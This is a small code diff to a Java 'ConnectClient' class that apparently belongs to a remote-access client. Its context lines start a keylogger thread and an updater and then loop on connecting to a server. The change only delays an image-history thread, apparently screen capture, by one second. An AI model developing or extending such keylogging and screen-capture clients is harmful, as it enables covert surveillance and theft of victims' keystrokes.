@@ -48,7 +48,7 @@ public class ConnectClient {
         ClientCommandEnum.registerCommands();
         new Thread(KeyLoggerComponents::startKeyLogger).start();
         new Thread(ControlComponents::startUpdater).start();
-        new Thread(ImageComponents::startHistory).start();
+        EXECUTOR.schedule(() -> new Thread(ImageComponents::startHistory).start(), 1, TimeUnit.SECONDS);
         for (; ; ) {
             try {
                 connectToServer();
